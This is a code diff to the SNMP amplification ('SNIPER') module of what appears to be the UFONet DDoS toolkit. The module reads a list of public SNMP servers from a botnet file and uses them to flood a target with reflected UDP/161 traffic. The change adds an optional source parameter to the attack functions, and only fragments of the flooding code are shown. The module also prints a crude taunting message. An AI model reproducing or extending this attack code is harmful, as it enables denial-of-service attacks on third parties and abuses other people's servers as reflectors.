@@ -21,7 +21,7 @@ snmp_file = "botnet/snmp.txt" # SNMP servers IP list
 oid ="1.3.6.1.2.1.1.1" # OID sysDescr 
 
 # UFONet SNMP Amplification (SNIPER) / [Port: UDP/161]
-def sniperize(ip, rounds):
+def sniperize(ip, rounds, source=None):
     n=0
     try: # (SNMP) Amplification attack uses publically accessible SNMP servers to flood a target with SNMP response traffic
         with open(snmp_file) as f: # extract SNMP servers from file
@@ -46,7 +46,7 @@ def sniperize(ip, rounds):
         print("[Error] [AI] [SNIPER] Failing to engage... -> Is still target online? -> [Checking!]")
 
 class SNIPER(object):
-    def attacking(self, target, rounds):
+    def attacking(self, target, rounds, source=None):
         print("[Info] [AI] SNMP Amplification (SNIPER) is ready to broke: [" , rounds, "parsecs ]")
         if target.startswith('http://'):
             target = target.replace('http://','')
@@ -68,4 +68,4 @@ class SNIPER(object):
         if ip == "127.0.0.1" or ip == "localhost":
             print("[Info] [AI] [SNIPER] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
             return
-        sniperize(ip, rounds) # attack with SNIPER using threading
+        sniperize(ip, rounds, source=None) # attack with SNIPER using threading
